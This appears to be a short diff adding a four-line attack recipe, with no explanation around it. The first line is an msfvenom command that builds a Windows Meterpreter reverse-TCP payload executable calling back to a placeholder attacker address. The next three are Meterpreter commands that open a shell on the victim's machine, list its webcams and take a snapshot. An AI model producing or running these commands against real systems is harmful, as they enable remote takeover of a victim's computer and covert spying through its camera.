@@ -1,0 +1,4 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=1234 -f exe > payload.exe
+shell
+webcam_list
+webcam_snap
